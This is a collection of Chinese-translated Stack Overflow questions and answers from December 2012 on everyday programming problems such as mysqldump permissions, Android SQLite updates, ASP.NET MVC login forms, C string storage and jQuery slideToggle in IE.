我知道这无疑是有用的，服务器在下载某些文件期间能够完成其他工作，但是在 youtube 或书籍中有很多时间有一些不精确的图表，因为当你遇到如下情况时异步节点速度较慢然后同步读取小文件（如下所示：85kB、170kB、255kB）。

```
var fs = require('fs');

var startMeasureTime = () => {
  var start = new Date().getTime();
  return start;
};

// synch version
console.log('Start');
var start = startMeasureTime();

for (var i = 1; i<=3; i++) {
  var fileName = `Lorem-${i}.txt`;
  var fileContents = fs.readFileSync(fileName);
  console.log(`File ${1} was downloaded(${fileContents.length/1000}KB) after ${new Date().getTime() - start}ms from start.`);

  if (i === 1) {
    var hardMath = 3*54/25*35/46*255/34/9*54/25*35/46*255/34/9*54/25*35/46*255/34/9*54/25*35/46*255/34/9*54/25*35/46*255/34/9;  
  };
};

// asynch version
setImmediate(() => {
  console.log('Start');
  var start = startMeasureTime();

  for (var i = 1; i<=3; i++) {
    var fileName = `Lorem-${i}.txt`;
    fs.readFile(fileName, {encoding: 'utf8'}, (err, fileContents) => {
      console.log(`File ${1} was downloaded(${fileContents.length/1000}KB) after ${new Date().getTime() - start}ms from start.`);
    });

    if (i === 1) {
      var hardMath = 3*54/25*35/46*255/34/9*54/25*35/46*255/34/9*54/25*35/46*255/34/9*54/25*35/46*255/34/9*54/25*35/46*255/34/9;  
    };
  };
});

This is from console:
Start
File 1 was downloaded(255.024KB) after 2ms from start.
File 1 was downloaded(170.016KB) after 5ms from start.
File 1 was downloaded(85.008KB) after 6ms from start.
Start
File 1 was downloaded(255.024KB) after 10ms from start.
File 1 was downloaded(85.008KB) after 11ms from start.
File 1 was downloaded(170.016KB) after 12ms from start. 
```

# linux - mySQLdump 从 Linux 机器到远程服务器上已安装的 Windows 文件夹

> ID：13822087
> 
> 赞同：0
> 
> 时间：2012-12-11T14:42:50.640
> 
> 标签：linux, windows, mount

我正在尝试从本地 Linux 机器到已安装在系统上的 Windows 文件夹执行 mysqldump。这是我在终端中使用的命令：

```
mysqldump -u root -plinuxsux myDB -t LOG > /mounted folder/path/blah/myDB.sql 
```

我收到以下错误：

```
/mounted folder/path/blah/myDB.sql: Permission denied 
```

我在 Windows 端检查了文件夹的权限，我创建了一个名为 Sys003 的特定用户，该用户可以完全控制该文件夹。

我是否需要将该用户名（和密码）放入上面的命令中才能使其工作？如果是这样，我该怎么做？谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-11T15:02:58.467

问题是实际运行`mysqldump`命令的用户没有写入目标文件夹的权限。

一种解决方案可能会更改为`Sys003`用户并`mysqldump`再次运行：

```
normal_prompt> su Sys003
password...
Sys003_prompt> mysqldump... 
```

另一个可以`mysqldump`作为普通用户运行，然后将转储复制为`Sys003`：

```
normal_prompt> mysqldump... > /local/dump.sql
normal_prompt> su Sys003
password...
Sys003_prompt> cp /local/dump.sql /mounted_folder/path/blah/myDB.sql 
```

小心，因为您的`Sys003`用户可能没有被授权运行`mysqldump`，但这是一个完全不同的问题:)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-11T15:07:41.090

这是 /etc/fstab 文件中的错误。我将用户作为与 Sys003 不同的用户。一旦我使用密码将用户设置为 Sys003，它就可以工作了。

# javascript - 根据经度和纬度显示谷歌地图

> ID：13822090
> 
> 赞同：1
> 
> 时间：2012-12-11T14:43:00.230
> 
> 标签：javascript, jquery, html, google-maps, coordinates

我的网站上有一个部分，它显示基于经度和纬度坐标的地图。我如何准确地更改或获取另一个州、城市或位置的数字/坐标？我试着在谷歌上输入“纽约的纬度和经度”并得到了这个网站[http://www.latlong.net/](http://www.latlong.net/)

看起来坐标可以从网站上工作，

例如纽约市是纬度：40.714353 经度：-74.005973

我将它们放入下面的 div 中，但它们没有在地图上显示任何内容。如果您查看下面的默认坐标，则适用于加利福尼亚并且工作正常。为什么是这样？

```
<div
 class="map"
 data-latitude="37,773606"
 data-longtitude="-122,490382"
></div> 
```

这是我的 Google 位置设置

```
 // Get map position
            var $map = $('#contact .map');
            var latitude = parseFloat($map.data('latitude').replace(',', '.'));
            var longtitude = parseFloat($map.data('longtitude').replace(',', '.'));
            var center = new google.maps.LatLng(latitude - 0.003105999999997721, longtitude);

            // Render map
            var map = new google.maps.Map($map[0], {
                zoom: 16,
                scrollWheel: false,
                center: center,

                mapTypeId: google.maps.MapTypeId.ROADMAP,
                mapTypeControl: false,
                panControlOptions: {
                    position: google.maps.ControlPosition.LEFT_CENTER
                },
                zoomControlOptions: {
                    position: google.maps.ControlPosition.LEFT_CENTER
                },
                scaleControlOptions: {
                    position: google.maps.ControlPosition.LEFT_CENTER
                }
            }); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-11T14:52:23.327

试试`$map.attr('data-longtitude').replace(',', '.')`，这应该可以。

# java - 卡片布局刷新/更新卡片

> ID：13822091
> 
> 赞同：2
> 
> 时间：2012-12-11T14:43:03.303
> 
> 标签：java, swing, jdbc, refresh, cardlayout

我有一个包含 displayPanel 和 buttonPanel 的 jFrame 女巫。在按钮面板中，有 2 个按钮（按钮 1、按钮 2）。当我按下按钮 1 时，显示面板中会显示一个新面板（card1）。Card1 有一个文本字段并将值写入数据库。当我按下按钮 2 时，显示面板中会显示一个新面板（卡片 2）。Card2 有一个组合框，显示数据库中的所有这些值。

我的问题 - 当我点击 button1，提交我的值，按 button2 - 组合框还没有显示该值。它只显示我是否关闭我的应用程序并再次运行它。

我是如何做到的，所以每次我按下“button2”（来自 jFrame 中的 buttonPanel）时，组合框中的值都会被刷新？

这是来自 jFrame 的代码，它负责显示卡片：

```
 private void button1ButtonActionPerformed(java.awt.event.ActionEvent evt) {     
       CardLayout card = (CardLayout) displayPanel.getLayout();
       card.show(displayPanel, "card1");
}

 private void button2ButtonActionPerformed(java.awt.event.ActionEvent evt) {     
       CardLayout card = (CardLayout) displayPanel.getLayout();
       card.show(displayPanel, "card2");
} 
```

这是从数据库中获取值并将它们放入 card2 中的组合框的代码：

```
public void fillComboBox(){    
    try {
    String sql = "SELECT * FROM Table1";
    pst = conn.prepareStatement(sql);
    rs = pst.executeQuery(sql);
    while (rs.next()){
    String user_name= rs.getString("user_name");
    pirmaspanelsvarbumoComboBox.addItem(user_name);
   }  
    } catch (Exception e) {
      JOptionPane.showMessageDialog(null, e); 
    }
} 
```

# android - 在android中更新表

> ID：13822095
> 
> 赞同：1
> 
> 时间：2012-12-11T14:43:17.437
> 
> 标签：android, sqlite

我正在尝试更新数据库中的 3 列。但是我的 logcat 中总是出现 javanullexception。

这是我更新它们的方法。

```
public void updateDetails(View v)
{
    UpdateBtn = (ImageButton)findViewById(R.id.updateBtn); 
    HeightIn = (EditText)findViewById(R.id.heightIn);
    HeightFt = (EditText)findViewById(R.id.heightFt);
    Weight = (EditText)findViewById(R.id.weight);

    UpdateBtn.setImageResource(com.example.gym.trainer.R.drawable.updatebtn2);
    UpdateBtn.setClickable(false);
    HeightIn.setEnabled(false);
    HeightFt.setEnabled(false);
    Weight.setEnabled(false);

    //Toast.makeText(getBaseContext(), Integer.parseInt(id) + ", " + String.valueOf(HeightFt.getText()) + ", " +  String.valueOf(HeightIn.getText()) + ", " +  String.valueOf(Weight.getText()), Toast.LENGTH_LONG).show();

    DBAdapter db = new DBAdapter(this);

    boolean success = db.updateHeightWeight(Integer.parseInt(id), String.valueOf(HeightFt.getText()), String.valueOf(HeightIn.getText()), String.valueOf(Weight.getText()));

    if(success == true)
        Toast.makeText(getBaseContext(), "Update Successful", Toast.LENGTH_SHORT).show();
    else
        Toast.makeText(getBaseContext(), "Update Failed", Toast.LENGTH_SHORT).show();

} 
```

可以使用注释的 toast 显示值，所以我很确定有值。

在我的 DBAdapter 类中：

```
public boolean updateHeightWeight(int rowId, String heightft, String heightin, String weight) 
{
     ContentValues args2 = new ContentValues();
     args2.put(KEY_HEIGHTFT, heightft);
     args2.put(KEY_HEIGHTIN, heightin);
     args2.put(KEY_WEIGHT, weight);
     return db.update(DATABASE_TABLE, args2, 
                      KEY_ROWID + "=" + rowId, null) > 0;// this is where the exception occurs
} 
```

这是我的 DBAdapter 类中的变量。

```
public static final String KEY_ROWID = "_id";
public static final String KEY_HEIGHTFT = "heightft";  
public static final String KEY_HEIGHTIN = "heightin";  
public static final String KEY_WEIGHT = "weight"; 
```

我的表结构：

```
private static final String DATABASE_CREATE =
    "create table if not exists profiles (_id integer primary key autoincrement, "
    + "firstname VARCHAR not null, age VARCHAR not null, " 
    + "heightft VARCHAR not null, heightin VARCHAR not null, weight VARCHAR not null,    duration VARCHAR not null, bmi VARCHAR not null);"; 
```

关于如何解决我的问题的任何想法？谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T14:52:29.873

打赌你在尝试使用它之前没有打开你的数据库。这种事情很常见。

```
 DBAdapter db = new DBAdapter(this);
    db.open(); <-----------
    boolean success = db.updateHeightWeight(Integer.parseInt(id), String.valueOf(HeightFt.getText()), String.valueOf(HeightIn.getText()), String.valueOf(Weight.getText())); 
```

# java - 在 Google App Engine 中测量任务队列成本

> ID：13822098
> 
> 赞同：0
> 
> 时间：2012-12-11T14:42:40.240
> 
> 标签：java, python, google-app-engine, task-queue, measurement

我通过检查**x-appengine-estimated-cpm-us-dollars**标头来衡量对 GAE 的请求的成本。这很好用，结合**x-appengine-resource-usage**和 **x-traceurl**我什至可以获得更详细的信息。

但是，我的应用程序的很大一部分是在任务队列的上下文中运行的。因此，队列消耗了很大一部分实例小时成本。每次在请求之外执行代码时，其成本都不包含在**x-appengine-estimated-cpm-us-dollars**标头中。

我正在寻找一种方法来衡量每个请求所消耗的全部成本。即请求本身产生的成本**和**该请求添加的任务的成本。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T17:14:54.740

这是矫枉过正。有一个工具可以下载 google app engine log 并将它们转换为 sqlite。 [http://code.google.com/p/google-app-engine-samples/source/browse/trunk/logparser/logparser.py](http://code.google.com/p/google-app-engine-samples/source/browse/trunk/logparser/logparser.py)

使用此工具，任务请求和普通请求的 cpm usd 将全部一起下载。您可以将每日日志存储到单独的 sqlite 文件中，并根据需要进行尽可能多的分析。

在将任务成本与原始请求相关联方面。使用此工具下载的日志数据包括`logging`模块的完整输出。

1.  所以你可以简单地在原始请求中记录一个生成 id
2.  将 id 传递给任务。
3.  在任务请求中再次记录收到的 id。
4.  通过 id 找到正常和任务请求对。

例如：

```
# in org request
a_id = genereate_a_random_id() 
logging.info(a_id) # the id will be included 

taskqueue.add(url='/path_to_task', params={'id': a_id})

# in task request
a_id = self.request.get('id')
logging.info(a_id) 
```

# 编辑1

我认为还有另一种可能的方法来估算正常请求+任务请求的成本。诀窍是将异步任务更改为同步（假设成本相同）。我没有尝试过，但尝试起来要容易得多。

```
# in org request, add a variable to identify debug
debug = self.request.get('DEBUG')

if debug:
    self.redirect('/path_to_task')
else:
    taskqueue.add(url='/path_to_task') 
```

因此，在使用 DEBUG 参数测试正常请求时。它将首先处理正常请求，然后为正常请求返回 x-appengine-estimated-cpm-us-dollars。稍后它会将您的测试客户端重定向到相关任务请求（任务请求也可以作为正常请求通过 url 客户端访问和触发）并为任务请求返回 x-appengine-estimated-cpm-us-dollars。您可以简单地将它们加在一起以获得总成本。

# cuda - 使用 CUDA 5 进行 surf3Dwrite

> ID：13822103
> 
> 赞同：1
> 
> 时间：2012-12-11T14:43:50.547
> 
> 标签：cuda

我正在尝试在使用 Surface Objects 的 CUDA 5 中编译内核。但是，这似乎并不完全按照手册中的描述工作。

```
__global__ void kernel_reset(cudaSurfaceObject_t surf)
{
    int x = blockIdx.x * blockDim.x + threadIdx.x;
    int y = blockIdx.y * blockDim.y + threadIdx.y;
    int z = blockIdx.z * blockDim.z + threadIdx.z;
    surf3Dwrite(0u, surf, x * sizeof(unsigned int), y, z, cudaBoundaryModeTrap);
} 
```

这无法编译：

```
error : no instance of overloaded function "surf3Dwrite" matches the argument list 
```

我想要的重载在 surface_indirect_functions.h 中列为：

```
static __forceinline__ __device__ void surf3Dwrite(unsigned int data, cudaSurfaceObject_t surfObject, int x, int y, int z, cudaSurfaceBoundaryMode boundaryMode = cudaBoundaryModeTrap) 
```

谁能告诉我我在这里做错了什么？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T15:17:33.443

我发现了这个问题的原因。

代码没问题 - 问题出在编译器参数中：由于纹理对象需要 2.0 或更高的计算能力，我不得不将 NVCC 编译器设置从“compute_10,sm_10”更改为“compute_20,sm_20”。这解决了这个问题。

谢谢。

# android - android：仅用于活动会话的共享首选项（直到它被销毁）

> ID：13822107
> 
> 赞同：0
> 
> 时间：2012-12-11T14:44:01.327
> 
> 标签：android

我有一个音乐服务，它通过一个复选框来控制我的音乐。复选框状态将正确保存在我的共享首选项中！基本配置 = 应用启动时的音乐打开，复选框也打开。这么久一切正常！

我只想**在活动的应用程序会话中**保存这些状态。重新启动我的应用程序后，它应该是基本状态（音乐和复选框打开）。在这段代码中，他从最后一个状态开始。

谢谢你的帮助！

**Java 代码：**

```
 chkBoxMusic = (CheckBox) findViewById(R.id.checkBoxMusic);

    boolean isChecked = getBooleanFromPreferences("isChecked");
    chkBoxMusic.setChecked(isChecked);

    chkBoxMusic.setOnCheckedChangeListener(new OnCheckedChangeListener() {
   public void onCheckedChanged(CompoundButton buttonview, boolean isChecked) {

    Log.i("boolean",""+isChecked);
    ActivitySound.this.putBooleanInPreferences(isChecked,"isChecked");

       if (!isChecked) {

          stopService(new Intent(ActivitySound.this, MusicService.class));
       }

       else {

          startService(new Intent(ActivitySound.this, MusicService.class));
       }

      }

       });

   }

    public void putBooleanInPreferences(boolean isChecked,String key) {

    SharedPreferences sharedPreferences = this.getPreferences(Activity.MODE_PRIVATE);
    SharedPreferences.Editor editor = sharedPreferences.edit();
    editor.putBoolean(key, isChecked);
    editor.commit();        
}

    public boolean getBooleanFromPreferences(String key) {

    SharedPreferences sharedPreferences = this.getPreferences(Activity.MODE_PRIVATE);
    Boolean isChecked = sharedPreferences.getBoolean(key, false);

    return isChecked;       

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T16:43:53.153

要删除*所有*共享首选项：

```
SharedPreferences myPrefs = getPreferences(Activity.MODE_PRIVATE);
SharedPreferences.Editor editor = myPrefs.edit();
editor.clear();
editor.commit(); 
```

但具体何时这样做仍在协商中 - 请参阅上面的评论！即使是现在，也不完全清楚你想要什么。您可以尝试将其放入`onStop`Activity 的方法中，看看是否能提供您想要的结果。

# java - java：观察一个函数直到给定时间

> ID：13822111
> 
> 赞同：0
> 
> 时间：2012-12-11T14:44:14.470
> 
> 标签：java, function

我喜欢为我的函数运行定义一个时间（比如 3、5 或 10 分钟），即如果我的函数在给定之前没有响应/返回任何内容，我想从该函数中抢夺控制权，或者我中断该函数并继续我喜欢。如果java线程有任何可能性，我也可以使用任何线程来实现这一点。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-11T14:47:44.527

如果我正确理解了您的问题，您可以使用[`Future`](http://docs.oracle.com/javase/1.5.0/docs/api/java/util/concurrent/Future.html)，然后您可以[`get`](http://docs.oracle.com/javase/1.5.0/docs/api/java/util/concurrent/Future.html#get%28long,%20java.util.concurrent.TimeUnit%29)超时调用。注意 get 是阻塞调用，`TimeoutException`如果等待超时，它会抛出。

# actionscript-3 - 如何动态链接 .ane 文件

> ID：13822112
> 
> 赞同：0
> 
> 时间：2012-12-11T14:44:14.813
> 
> 标签：actionscript-3, apache-flex, air, flex4.6, air-native-extension

我创建了一个原生扩展。我可以将此应用程序作为桌面应用程序进行调试。运行良好，使用本机扩展类时没有问题。但是当我为 Premiere Pro 进行调试时，我得到“

> 类 com.extenison.samples.ANESample::myClass 找不到

“错误。您知道我在调试 Premiere Pro 扩展时缺少什么吗？
-我在属性的本机扩展选项卡上
添加了 .ane 文件-还在库路径选项卡上添加了 .swc 文件
-在 Flex 构建打包选项卡中选中了包
- 我可以在 Flex Build Packaging 的 Package Contents 部分看到 .ane 文件

谢谢

编辑：这个问题是关于链接本机扩展。任何帮助对此表示赞赏

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-17T05:23:56.460

您可以忽略此错误并继续使用 adt 命令创建 .ipa。错误是因为跨平台。虽然检查了这些点，但您将 .swc 作为属性的外部参考。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-14T08:04:03.230

如果我们为在某些设备上运行的应用程序创建 .ane 文件，这意味着我们将打包我们的项目，并且设备将从包中读取文件。
我的本机扩展 (.ane) 文件在本地工作，作为桌面应用程序，因为没有打包过程。
没有在 Adob​​e Premiere 上工作，因为 ;

*   将 .ane 文件放在 yourproject/src/ 目录下的某个文件夹中
*   转到 project/properties/Flex Build Packaging 并检查您的 .ane 文件
*   在上面的同一目录中，单击 Package Contents 选项卡并确保您的 .ane 文件在列表中
    我没有这样做:) 但你这样做了。

# c# - 单击按钮将参数传递给控制器

> ID：13822114
> 
> 赞同：1
> 
> 时间：2012-12-11T14:44:21.397
> 
> 标签：c#, asp.net-mvc

这可能是一个微不足道的问题，我是一只新蜜蜂 :) 这是我的查看代码

```
<button type="button" id="btnLogin" onclick="location.href='<%: Url.Action("Authenticate", "Login") %>'" runat="server"></button> 
```

这是我的控制器代码

```
 public ActionResult Authenticate(string username,string password)
    {
        bool status = Login.Authenticate(username, password);
        return View("Status", status);
    } 
```

我可以去那个控制器，但我无法传递参数。任何人都可以让我知道将参数传递给控制器​​功能的常规方法是什么。

***完整查看代码***

```
<table>
    <tr>
        <td>
            <input type="text" id="txtUsername" runat="server" />
        </td>
        <td>
            <input type="text" id="txtPassword" runat="server" />
        </td>
    </tr>
    <tr>
        <td colspan="2" align="center">
            <button type="button" id="btnLogin" onclick="location.href='<%: Url.Action("Authenticate", "Login") %>'" runat="server"></button>
        </td>
    </tr>
</table> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-11T14:52:52.853

您可以使用其`name`属性传递输入值。

```
<%using (Html.BeginForm("Authenticate", "Login"))
{%>
    <table>
        <tr>
            <td>
                <input type="text" id="txtUsername" name="username" />
            </td>
            <td>
                <input type="text" id="txtPassword" name="password"  />
            </td>
        </tr>
        <tr>
            <td colspan="2" align="center">
                <input type="submit" value="Login" class="submit_button"/>
            </td>
        </tr>
    </table>
<%}%> 
```

控制器

```
[HttpPost]
public ActionResult Authenticate(string username, string password)
{
    bool status = Login.Authenticate(username, password);
    return View("Status", status);
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2016-04-05T14:04:59.223

您知道 url 操作还有第三个参数，您可以在其中添加参数

```
@Url.Action("Authenticate", "Login" , new {name = "name"}) 
```

你只需要一种方法来增加你的价值

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-11T14:47:20.717

使用`<form>`发布到控制器中的 Authenticate 方法的 a 。也将其更改`<button>`为`<input type="submit"`

像这样：

```
<form method="post" action="@Href("~/account/authenticate")" id="LogOnForm">
.... @*input boxes*@
<input type="submit" value="Login"/>
</form> 
```

编辑：对于 ajax 登录，请使用此脚本（需要 jquery）。请注意，表格需要一个`ID`

```
<script type="text/javascript">
      $(document).ready(function () {
            $("#LogOnForm").submit(function (event) {
                event.preventDefault();                
                $.ajax({
                    type: "POST",
                    url: '@Url.Content("~/account/authenticate")',
                    data: $("#LogOnForm").serialize(),
                    success: function (data) {                       
                       if (data.Status) {
                            //Logged in succesfully
                         } else {
                            //Login failed
                         }
                    },
                    error: function (xhr, ajaxOptions, thrownError) {                            
                        console.log(xhr.responseText);
                    }
                });
            });
      });

    </script> 
```

编辑：控制器修改：

```
public JsonResult Authenticate(string username,string password)
    {
        bool status = Login.Authenticate(username, password);
        return Json( new @"Status", status);
    } 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-11T15:16:32.297

您需要使用 Javascript 将参数放入调用字符串

```
<script type="text/javascript">
    function postdata(location) {
        var url = '<%: Url.Action("Authenticate", "Login", new { username = XXX, password = YYY) %>';
        var Username = document.getElementById(Username).value;
        var Password= document.getElementById(Password).value;
        url = url.replace("XXX", Username );
        url = url.replace("YYY", Password);
        location.href=url;
    }
</script>

<button type="button" id="btnLogin" onclick="postdata()" runat="server"></button> 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2015-10-28T06:23:43.303

输入字段中缺少名称属性。将名称属性添加到您的用户名和密码输入框中。name 属性应该与您的操作控制器参数相同。

```
<table>
    <tr>
        <td>
            <input type="text" id="txtUsername" runat="server" name="username" />
        </td>
        <td>
            <input type="text" id="txtPassword" runat="server"  name="password"/>
        </td>
    </tr>
    <tr>
        <td colspan="2" align="center">
            <button type="button" id="btnLogin" onclick="location.href='<%: Url.Action("Authenticate", "Login") %>'" runat="server"></button>
        </td>
    </tr>
</table> 
```

# c - 用于在 C 中存储字符串的链表或数组

> ID：13822115
> 
> 赞同：2
> 
> 时间：2012-12-11T14:44:20.140
> 
> 标签：c, arrays, string, linked-list

在 C 中，我需要存储一个可能相对较大（数千个项目）的短字符串 (char*) 列表。
字符串可以删除或插入但不能修改，顺序并不重要。
我不知道什么是更有效的数据结构来做到这一点。
我可以使用 struct ：

```
struct node_s {
  char *str;
  node_s *next;
} 
```

或 char * 数组：

```
char **strings; 
```

我不需要*直接*访问字符串，我只需要它们存在，因为旁边的另一个数据结构（radix trie）维护字符串某些部分的指针。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-11T14:52:49.843

当您在初始化时不知道确切的条目数时，使用链表通常比使用数组更好。

数组具有固定大小。当您不知道将拥有多少条目并且想要使用数组时，您有两种选择。要么你分配一个比你需要的任何东西都大得多的数组，这是对内存的巨大浪费（而且，通常很难事先知道合理的上限应该是多少）。或者你从一个小数组开始，等到它满了。然后分配一个更大的新数组，将所有条目复制到新数组并释放旧数组，这是对 CPU 周期的巨大浪费。

但是使用链表，您就没有这个问题，因为它们可以动态增长和收缩。

但请注意各种操作的运行时间差异。

在数组中，通过索引获取元素非常快。但是删除具有特定索引的元素而不留下空条目是非常昂贵的，因为后面的每个元素都必须向后移动一个索引。在中间插入一个条目而不覆盖现有条目同样昂贵，因为您必须将后面的所有内容向前移动一个。

使用链表，删除或插入中间的节点很快（当您已经有了它的前导节点时），因为除了插入的节点及其前导节点之外没有其他节点需要被触及。但是找到必须执行此操作的节点可能会很昂贵，因为您必须通过之前的所有节点跟踪链接。

当您需要快速查找和快速插入/删除时，使用[二叉树](http://en.wikipedia.org/wiki/Binary_tree)是一个很好的折衷方案。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-11T14:47:15.573

这取决于你的程序。

如果你知道字符串的数量。我建议你使用数组

如果您不知道字符串的数量，我建议您使用链表

如果字符串将在 C 中定义为常量。你可以这样使用：

```
char *strings[1000] = {
  "string 0",
  "string 1",
  "string 2",
  "string 3",
   .
   .
   .
  "string 999"
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-11T14:47:17.743

实际上，`char **strings`只是一个字符串数组。数组≠链表。那么`node_s`绝对是解决方案。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-12-11T14:50:40.887

这取决于你想用它们做什么。

如果顺序不重要，我认为大多数操作将是添加\删除。如果是这样，您需要选择列表数据结构（第一个变体）。

如果您需要对元素进行恒定时间访问，则数组很好，但在无序数组中，这将不起作用.. 搜索某些字符串将花费 O(n) 时间，就像在列表中一样。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-12-11T15:59:18.460

所以，如果我理解正确的话，字符串列表不是访问数据的主要方式，它只是一个指针的“清理列表”，必须释放这些指针，而不必遍历所有其他现已过时的数据。

在这种情况下，我会使用链表，但不是以正常方式。您的`node_s`上述要求，对于每个字符串，您`malloc`为结构执行一个，为字符串本身执行一个。

相反，我会定义一个这样的结构：

```
struct string_list {
  struct string_list *next;
  char data[0];
}; 
```

零长度数组在结构中不占用空间，但为您提供了一个可以使用的类型化地址。*然后，您可以为结构和*实际字符串分配内存：

```
struct string_list *newstr = malloc (sizeof(struct string_list) + my_desired_size); 
```

然后将数据放在`newstr->data`，并链接`next`指针：

```
newstr->next = list_head;
strcpy (newstr->data, my_data, my_desired_size);
list_head = newstr; 
```

当需要释放字符串时，只`free`需要一个即可。哦，当然还有修复链接。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-12-11T15:41:08.027

当您有大量项目并且想要频繁添加/删除项目时，同时访问时间接近随机访问 O(log n)，您应该考虑使用[哈希表](http://en.wikipedia.org/wiki/Hash_table)。

如果在节点上添加数千个，则链表的访问时间会非常慢，并且数组不适合频繁添加/删除。

# jquery - slideToggle 工作正常，除了在 IE 中，div 在最后隐藏，除非给出 min-height？

> ID：13822117
> 
> 赞同：1
> 
> 时间：2012-12-11T14:44:29.113
> 
> 标签：jquery, html, slidetoggle, css

我`slideToggle`在 a 上使用了jQuery`<div>`来提供良好的旧“下拉”效果。

我让它在 chrome 中完全按照我想要的方式工作。然后我在 IE 中尝试了它，遇到了一些很奇怪的东西。我可以看到动画很好，`<div>`会扩展到它的全高，但是当动画完成时，`<div>`会消失吗？

我尝试了一些不同的方法来阻止它这样做，结果证明给`<div>`any `min-height`（我给它 1px）允许它工作。

我真的很想知道为什么必须`min-height`在 IE 中提供一个才能使此功能正常工作？把它放在那里没什么大不了的，但我宁愿理解*为什么*我必须把它放在那里。代码如下。

**HTML 结构**

```
<div class="home_popConfiCont rbAll">
<div class="home_popConfiHead">Your Confidential Details<div class="arrow-up"></div></div>
<div class="home_popConfiBody">
    Lots and lots of text
</div>
</div> 
```

**jQuery**

```
$(function(){
    var confOpen = 0;
    $(".home_popConfiHead").click(function(){
        if(confOpen){
            $(".arrow-up").attr("class","arrow-up");
            $(".home_popConfiBody").stop(true, true).slideToggle(100);
            confOpen = 0;
        }
        else{
            $(".arrow-up").attr("class","arrow-up arrow-down");
            $(".home_popConfiBody").stop(true, true).slideToggle(100);
            confOpen = 1;
        }
    });
}); 
```

**应用于上述的 CSS `<div>`：**

```
.home_popConfiBody{padding:5px 5px 0 5px; display:none;line-height:20px;min-height:1px;} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T15:02:43.443

您可能遇到了“hasLayout”问题。

[http://reference.sitepoint.com/css/haslayout](http://reference.sitepoint.com/css/haslayout)

有很多东西可以给你的 div 布局，你已经发现了其中之一：最小高度。除了 min-height 您还可以使用这些值（取自参考文章）：

*   显示：内联块
*   高度：（除自动之外的任何值）
*   浮动：（左或右）
*   位置：绝对
*   宽度：（除自动之外的任何值）
*   写作模式：tb-rl
*   缩放：（除正常值外的任何值）4
*   最小高度：（任何值）
*   最大高度：（除无之外的任何值）
*   最小宽度：（任何值）
*   最大宽度：（除无之外的任何值）
*   溢出：（除可见之外的任何值）
*   溢出-x：（除可见之外的任何值）
*   溢出-y：（除可见之外的任何值）5
*   位置：固定

我认为人们通常会使用**zoom: 1**来触发布局，因为它对页面内容没有任何明显的可见效果。

如果我正在切换的 div 里面有浮动元素，那么我通常会应用一个**溢出：隐藏；**到 div。这会导致 div 扩展到内部浮动元素的高度。

# git - 超越比较 2 作为 Git Mergetool

> ID：13822124
> 
> 赞同：3
> 
> 时间：2012-12-11T14:44:47.943
> 
> 标签：git, beyondcompare

我正在尝试使用超越比较 2 与 Git 作为合并工具，遵循以下示例： http: [//www.iokom.com/drupal/node/4](http://www.iokom.com/drupal/node/4)

该示例使用超越比较 3，所以我只是替换了我的目录结构，我并不惊讶它不起作用。我环顾四周，但大多数教程都使用 BC3，并且这里有很多帖子。BC2 兼容吗？

我编辑了我的全局配置文件，如链接所示，但得到以下...

```
Mark@MARK-PC /c/git ((ref: re...))
$ git mergetool
fatal: bad config file line 27 in C:\Program Files (x86)\Git/etc/gitconfig 
```

我该如何使用 BC2？这个错误是什么意思？它是泄露我的路径还是配置中的参数对于 BC2 是否错误？提前致谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-11T16:11:54.987

Beyond Compare 2 不支持与祖先的 3 路合并，因此所写的说明将不起作用。您可以使用 /savetarget= 开关将其配置为进行 2 路合并。试试这个配置：

```
[merge]
tool = bc2

[mergetool "bc2"]
cmd = 'C:\Program Files (x86)\Beyond Compare 2\BC2.exe' \
  "$PWD/$LOCAL" \
  "$PWD/$REMOTE" \
  /savetarget="$PWD/$MERGED"
keepBackup = false
trustExitCode = false 
```

请注意，由于它无法使用祖先文件，因此无法检测到冲突。您必须仔细检查文件并手动合并所有内容。另外，界面还是2路比较；您需要将一个文件中的所有更改提取到另一个文件中，然后保存。这个`/savetarget`开关使得任何时候你保存任何一个文件它都会覆盖那个路径。

# c# - Web 服务中的 NULL 会话

> ID：13822125
> 
> 赞同：1
> 
> 时间：2012-12-11T14:44:52.327
> 
> 标签：c#, asp.net, web-services, session

我将应用程序从 prod 移动到开发服务器，现在我的 Web 服务中的会话将无法保存。我在想它可能是IIS中的一个设置？但我不知道在哪里看。

这是坏的：

```
[System.Web.Services.WebMethod(enableSession: true)]
public static List<RequestType> GetRequestType(string itemNo, int requestTypeID)
{
    UserSession usObj = (UserSession)HttpContext.Current.Session["UserSessionObj"]; 
```

usObj 出来 NULL

# php - PHPexcel 单元格缓存

> ID：13822127
> 
> 赞同：1
> 
> 时间：2012-12-11T14:44:16.513
> 
> 标签：php, caching, phpexcel

我正在使用大型 excel 文件，我已经删除了限制，有没有一种方法可以更快地阅读我的单元格。我有 6000 行并减少了我的 wamp 文件夹中的 tmp 文件夹。

```
set_time_limit(0);
ini_set('memory_limit', '-1');
include'../Classes/PHPExcel.php';
include'../Classes/PHPExcel/IOFactory.php';
$cacheMethod = PHPExcel_CachedObjectStorageFactory::cache_to_phpTemp;
$cacheSettings =    array( ' memoryCacheSize ' =>'8MB');    
PHPExcel_Settings::setCacheStorageMethod($cacheMethod, $cacheSettings);
